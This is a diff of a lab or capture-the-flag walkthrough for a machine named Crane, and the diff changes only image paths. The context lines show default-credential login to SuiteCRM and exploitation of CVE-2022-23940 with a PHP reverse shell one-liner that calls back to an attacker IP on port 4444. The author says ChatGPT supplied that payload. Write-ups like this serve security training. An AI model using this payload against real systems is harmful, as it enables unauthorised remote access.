@@ -45,24 +45,24 @@ Nmap done: 1 IP address (1 host up) scanned in 74.21 seconds
 ```
 
 Visiting web server on port 80.
-![](Crane1.png)
+![](Images/Crane1.png)
 Logged in with default creds `admin : admin`
-![](Crane3.png)
+![](Images/Crane3.png)
 On the upper right corner, I clicked on the admin user and checked the “about” page which consists of the version of CRM Suite :
 
-![](Crane2.png)
+![](Images/Crane2.png)
 The next thing is googling for a suitable exploit for the given version of SuiteCrm and I found the following :
 https://github.com/manuelz120/CVE-2022-23940
-![](Crane4.png)
+![](Images/Crane4.png)
 We tried generating single liner php reverse shell but we got multiple errors because of quoting.
-![](Crane5.png)
+![](Images/Crane5.png)
 So we used chatgpt and it gave us clean payload.
 ```python
 python3 exploit.py -h http://192.168.166.146 -u admin -p admin --payload 'php -r '\''$sock=fsockopen("192.168.45.222",4444);exec("/bin/sh -i <&3 >&3 2>&3");'\'''
 ```
-![](Crane6.png)
+![](Images/Crane6.png)
 ### Privilege Escalation
-![](Crane7.png)
-![](Crane8.png)
-![](Crane9.png)
+![](Images/Crane7.png)
+![](Images/Crane8.png)
+![](Images/Crane9.png)
 
